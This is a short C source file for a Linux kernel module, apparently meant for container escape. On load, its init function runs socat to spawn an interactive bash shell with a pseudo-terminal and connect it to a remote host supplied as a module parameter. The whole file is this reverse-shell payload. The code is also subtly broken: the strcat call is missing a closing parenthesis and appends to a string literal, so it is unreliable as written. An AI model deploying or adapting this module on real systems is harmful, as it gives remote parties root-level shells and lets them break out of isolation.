#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched/signal.h>
#include <linux/nsproxy.h>
#include <linux/proc_ns.h>

MODULE_LICENSE("GPL");

static char *host = "";

module_param(host, charp, 0000);
MODULE_PARM_DESC(host, "");

static int __init escape_start(void)
{
    static char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    char *argv[] = { "/usr/bin/socat", "exec:/bin/bash -li,pty,stderr,setsid,sigint,sane", strcat(host,",forever", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}

static void __exit escape_end(void)
{

}

module_init(escape_start);
module_exit(escape_end);
